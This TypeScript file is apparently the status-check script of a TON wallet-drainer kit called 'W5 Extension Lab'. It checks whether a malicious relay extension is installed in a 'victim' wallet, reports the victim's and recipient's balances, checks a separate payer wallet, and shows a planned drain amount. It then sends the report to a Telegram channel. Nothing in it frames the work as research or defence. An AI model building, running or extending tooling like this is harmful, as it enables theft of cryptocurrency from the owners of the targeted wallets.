import { mnemonicToPrivateKey } from "@ton/crypto";
import { Address, fromNano } from "@ton/core";
import { TonClient, WalletContractV5R1 } from "@ton/ton";
import { loadConfig } from "./utils.js";
import { networkGlobalId, tonClientOptions } from "./env.js";
import { tgLog } from "./tg-logger.js";
import { isRelayExtensionInstalled } from "./extensions-check.js";
import { mnemonicMatchesVictim, resolveVictimAddress } from "./victim.js";
import { resolveTriggerMnemonic } from "./payer.js";

const ok = "✅";
const no = "❌";

async function main() {
  const lines: string[] = [];
  const log = (s: string) => {
    console.log(s);
    lines.push(s);
  };

  const cfg = loadConfig();
  const network = networkGlobalId() === -3 ? "testnet" : "mainnet";
  const relay = Address.parse(cfg.relayAddress);
  const victim = Address.parse(cfg.walletA);

  log(`🔧 <b>W5 Extension Lab</b>`);
  log(`Сеть: <b>${network}</b>`);
  log("");

  const client = new TonClient(tonClientOptions());

  log("<b>📋 Кошельки</b>");
  log(`Жертва (C): <code>${cfg.walletA}</code>`);

  let victimEnvOk = false;
  try {
    const resolved = await resolveVictimAddress();
    victimEnvOk = resolved.equals(victim);
    if (process.env.WALLET_VICTIM?.trim()) {
      log(`WALLET_VICTIM ↔ config: ${victimEnvOk ? ok : no} (TON Connect)`);
    } else {
      log(`.env victim ↔ config: ${victimEnvOk ? ok : no}`);
    }
  } catch (e: any) {
    log(`Victim .env: ${no} ${e.message || e}`);
  }

  const mnMatch = await mnemonicMatchesVictim(victim);
  if (mnMatch === null) {
    log(`Install: TON Connect (<code>install.html</code>), MNEMONIC_A не нужен`);
  } else {
    log(`MNEMONIC_A ↔ C: ${mnMatch ? ok : no}`);
  }

  let balA = "—";
  try {
    balA = fromNano(await client.getBalance(victim));
  } catch {}
  log(`Баланс C: <b>${balA} TON</b>`);

  let balB = "—";
  try {
    balB = fromNano(await client.getBalance(Address.parse(cfg.walletB)));
  } catch {}
  log(`Получатель (B): <code>${cfg.walletB}</code>`);
  log(`Баланс B: <b>${balB} TON</b>`);
  log("");

  log("<b>📡 Relay</b>");
  log(`Адрес: <code>${cfg.relayAddress}</code>`);

  let relayActive = false;
  try {
    const state = await client.getContractState(relay);
    relayActive = state.state === "active";
  } catch {}
  log(`Активен: ${relayActive ? ok : no}`);

  let balR = "—";
  try {
    balR = fromNano(await client.getBalance(relay));
  } catch {}
  log(`Баланс Relay: <b>${balR} TON</b>`);
  log("");

  log("<b>🔗 Extension</b>");
  const extensionInstalled = await isRelayExtensionInstalled(
    client,
    victim,
    relay,
  );
  log(`Relay в get_extensions: ${extensionInstalled ? ok : no}`);
  log("");

  log("<b>⚡ Trigger (комиссии)</b>");
  try {
    const triggerMn = resolveTriggerMnemonic();
    const triggerKey = await mnemonicToPrivateKey(triggerMn.split(/\s+/));
    const payer = WalletContractV5R1.create({
      walletId: { networkGlobalId: networkGlobalId() },
      publicKey: triggerKey.publicKey,
      workchain: 0,
    });
    let balT = "—";
    try {
      balT = fromNano(await client.getBalance(payer.address));
    } catch {}
    const sameAsVictim = payer.address.equals(victim);
    log(`Payer: <code>${payer.address.toString()}</code>`);
    log(`Баланс payer: <b>${balT} TON</b>${sameAsVictim ? " (тот же C — лучше отдельный trigger)" : ""}`);
  } catch (e: any) {
    log(`Payer: ${no} ${e.message || e}`);
  }
  log("");

  log(`Сумма списания (в relay): <b>${cfg.drainAmount} TON</b>`);

  const allGood = victimEnvOk && relayActive && extensionInstalled;
  log("");
  log(allGood ? `${ok} <b>Всё в порядке</b>` : `⚠️ <b>Есть проблемы</b>`);

  await tgLog(lines.join("\n"));
  console.log("\n→ Отправлено в Telegram");
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
